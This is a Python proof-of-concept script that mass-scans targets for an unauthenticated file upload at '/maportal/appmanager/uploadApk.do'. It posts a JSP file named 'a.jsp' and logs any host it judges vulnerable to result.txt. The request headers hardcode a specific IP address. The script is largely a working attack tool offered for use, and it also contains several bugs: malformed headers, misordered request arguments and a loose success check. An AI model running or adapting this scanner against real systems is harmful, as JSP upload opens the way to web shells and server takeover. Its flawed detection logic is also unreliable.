#-*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    
  ______ _ _        _    _       _                 _ 
 |  ____(_) |      | |  | |     | |               | |
 | |__   _| | ___  | |  | |_ __ | | ___   __ _  __| |
 |  __| | | |/ _ \ | |  | | '_ \| |/ _ \ / _` |/ _` |
 | |    | | |  __/ | |__| | |_) | | (_) | (_| | (_| |
 |_|    |_|_|\___|  \____/| .__/|_|\___/ \__,_|\__,_|
                          | |                        
                          |_|                        
                                              
             @version:1.0.0             @author: dkop        
    """
    print(test)


def poc(target):
    url = target+"/maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1"
    headers ={
                "Host: 58.210.96.108:9051",
                "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                " Chrome/109.0.5414.120 Safari/537.36"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                "Connection: close",
                "Content-Length: 256"}
    data={
        """------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
        Content-Type: application/msword

        hello
        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
"""}
   
    try:
        res = requests.post(url,headers,data,verify=False,timeout=5).text
        if '2' in res:
            print(f"[+] {target} is vulable,file_upload")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} is not vulable")

    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description=' admin  Password')
    parser.add_argument("-u", "--url", dest="url", type=str)
    parser.add_argument("-f", "--file", dest="file", type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()